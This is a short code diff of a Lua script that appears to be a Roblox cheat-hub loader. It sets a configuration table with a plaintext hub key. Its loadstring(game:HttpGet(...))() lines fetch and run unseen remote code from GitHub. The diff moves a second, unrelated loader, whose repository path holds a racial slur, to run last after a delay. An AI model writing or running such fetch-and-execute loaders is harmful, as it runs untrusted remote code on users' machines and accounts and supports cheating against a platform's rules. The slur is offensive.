@@ -1,5 +1,3 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Forst29931/niger/refs/heads/main/iloveit"))()
-wait(10)
 getgenv().ATConfig = {
     -- ## General
     hub_key = "46234d005bd619f3772c84336d00935a", -- 2G KEY
@@ -35,4 +33,5 @@ getgenv().ATConfig = {
     LeaveDelay = 120 -- Delay in seconds to wait before leaving
 }
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Roleck11/2G_HUB/refs/heads/main/ROLOX_UTILITY"))()
-
+wait(10)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Forst29931/niger/refs/heads/main/iloveit"))()
